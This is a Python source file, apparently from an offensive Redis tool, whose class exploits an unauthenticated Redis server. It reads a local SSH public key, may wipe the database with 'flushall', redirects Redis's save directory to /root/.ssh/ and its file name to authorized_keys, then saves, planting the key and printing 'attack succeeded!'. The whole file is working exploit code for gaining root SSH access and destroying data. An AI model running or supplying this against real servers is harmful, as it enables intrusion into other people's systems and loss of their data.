from lib.Decorator import CatchPrivilegeException, CatchConnectionException


class RsaInjection:
    def __init__(self, Controller):
        # self.path = os.path.split(os.path.realpath(__file__))[0] + '\\..' + '\\db\\' + '\\rsa.txt'
        self.path = './db/rsa.txt'
        self.r = Controller.r
        self.flush = Controller.options.flush
        self.rsa = self.rsaReader()
        print("PUBLIC KEY PATH " + self.path)
        print("PUBLIC KEY " + self.rsa.strip())
        self.rsaInject()

    def rsaReader(self):
        with open(self.path, 'r') as f:
            text = f.read()
            # print(text)
        return text

    @CatchPrivilegeException
    @CatchConnectionException
    def rsaInject(self):
        if self.flush is not True:
            self.r.execute_command("flushall")
        print("[*]config setting")
        self.r.config_set("dir", "/root/.ssh/")
        self.r.config_set("dbfilename", "authorized_keys")
        self.r.set("pub", self.rsa)
        print("[*]saving")
        self.r.save()
        print("[+]attack succeeded!")
